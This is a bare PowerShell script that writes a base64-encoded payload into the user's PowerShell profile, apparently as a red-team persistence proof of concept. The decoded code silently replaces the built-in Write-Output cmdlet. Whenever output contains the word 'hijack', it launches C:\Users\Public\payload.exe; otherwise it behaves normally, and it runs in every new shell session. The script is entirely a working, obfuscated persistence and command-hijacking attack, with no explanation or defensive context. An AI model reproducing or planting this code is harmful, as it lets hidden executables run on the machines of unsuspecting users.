$a = test-path $profile
if (-not $a){
    New-Item -Path $profile -Type File -Force
}
$hijacked_fnc = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gV3JpdGUtT3V0cHV0ewpbQ21kbGV0QmluZGluZyhIZWxwVXJpPSdodHRwczovL2dvLm1pY3Jvc29mdC5jb20vZndsaW5rLz9MaW5rSUQ9MTEzNDI3JywgUmVtb3RpbmdDYXBhYmlsaXR5PSdOb25lJyldCnBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTAsIFZhbHVlRnJvbVBpcGVsaW5lPSR0cnVlLCBWYWx1ZUZyb21SZW1haW5pbmdBcmd1bWVudHM9JHRydWUpXQogICAgW0FsbG93TnVsbCgpXQogICAgW0FsbG93RW1wdHlDb2xsZWN0aW9uKCldCiAgICBbcHNvYmplY3RbXV0KICAgICR7SW5wdXRPYmplY3R9LAoKICAgIFtzd2l0Y2hdCiAgICAke05vRW51bWVyYXRlfSkKCmJlZ2luCnsKICAgIHRyeSB7CiAgICAgICAgJG91dEJ1ZmZlciA9ICRudWxsCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVycy5UcnlHZXRWYWx1ZSgnT3V0QnVmZmVyJywgW3JlZl0kb3V0QnVmZmVyKSkKICAgICAgICB7CiAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVyc1snT3V0QnVmZmVyJ10gPSAxCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnMuSW5wdXRPYmplY3RbMF0gLWNsaWtlICcqaGlqYWNrKicpewogICAgICAgICAgICAkd3JhcHBlZENtZCA9ICRFeGVjdXRpb25Db250ZXh0Lkludm9rZUNvbW1hbmQuR2V0Q29tbWFuZCgnTWljcm9zb2Z0LlBvd2VyU2hlbGwuTWFuYWdlbWVudFxTdGFydC1Qcm9jZXNzJywKICAgICAgICAgICAgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQ29tbWFuZFR5cGVzXTo6Q21kbGV0KQogICAgICAgICAgICAkUFNCb3VuZFBhcmFtZXRlcnMuUmVtb3ZlKCdJbnB1dE9iamVjdCcpOyAKICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzLlJlbW92ZSgnTm9FbnVtZXJhdGUnKTsgCiAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVycy5BZGQoJ1BTUGF0aCcsICdDOlxVc2Vyc1xQdWJsaWNccGF5bG9hZC5leGUnKTsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgJHdyYXBwZWRDbWQgPSAkRXhlY3V0aW9uQ29udGV4dC5JbnZva2VDb21tYW5kLkdldENvbW1hbmQoJ01pY3Jvc29mdC5Qb3dlclNoZWxsLlV0aWxpdHlcV3JpdGUtT3V0cHV0JywKICAgICAgICAgICAgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQ29tbWFuZFR5cGVzXTo6Q21kbGV0KQogICAgICAgIH0KICAgICAgICAkc2NyaXB0Q21kID0geyYgJHdyYXBwZWRDbWQgQFBTQm91bmRQYXJhbWV0ZXJzfQogICAgICAgICRzdGVwcGFibGVQaXBlbGluZSA9ICRzY3JpcHRDbWQuR2V0U3RlcHBhYmxlUGlwZWxpbmUoJG15SW52b2NhdGlvbi5Db21tYW5kT3JpZ2luKQogICAgICAgICRzdGVwcGFibGVQaXBlbGluZS5CZWdpbigkUFNDbWRsZXQpCiAgICB9IGNhdGNoIHsKICAgICAgICB0aHJvdwogICAgfQp9CnByb2Nlc3MKewogICAgdHJ5IHsKICAgICAgICAKICAgICAgICAkc3RlcHBhYmxlUGlwZWxpbmUuUHJvY2VzcygkXykKICAgICAgIAogICAgfSBjYXRjaCB7CiAgICAgICAgdGhyb3cKICAgIH0KfQoKZW5kCnsKICAgIHRyeSB7CiAgICAgICAgJHN0ZXBwYWJsZVBpcGVsaW5lLkVuZCgpCiAgICB9IGNhdGNoIHsKICAgICAgICB0aHJvdwogICAgfQp9Cn0KPCMKCi5Gb3J3YXJkSGVscFRhcmdldE5hbWUgTWljcm9zb2Z0LlBvd2VyU2hlbGwuVXRpbGl0eVxXcml0ZS1PdXRwdXQKLkZvcndhcmRIZWxwQ2F0ZWdvcnkgQ21kbGV0CgojPgoK"))
echo "$hijacked_fnc" > $profile
